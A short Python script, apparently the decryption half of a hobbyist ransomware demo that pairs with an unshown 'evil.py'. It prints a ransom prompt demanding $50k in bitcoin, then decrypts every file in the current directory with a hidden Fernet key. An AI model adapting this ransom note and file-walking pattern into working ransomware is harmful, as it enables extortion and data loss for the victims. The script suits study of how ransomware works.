#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

print("retreiving files...")

for file in os.listdir():
	if file == "evil.py" or file == ".hiddenkey.key" or file == "hero.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print("taking in a fake key that is not useful whatsoever")
fake_key = input(
'''
Please enter decryption key

pay $50k in bitcoin to 
NoobGrinder420@bitcoin
if you do not have the key 

(or find .hiddenkey.key)
'''
	)

with open(".hiddenkey.key", "rb") as fin:
	key = fin.read()


print("decrypting files...")

for file in files:
	with open(file, "rb") as fin:
		content = fin.read()

	decrypted_content = Fernet(key).decrypt(content) #returns bytestring

	with open(file, "wb") as fout:
		fout.write(decrypted_content)


print("files unlocked!! thanks for the 50k") 

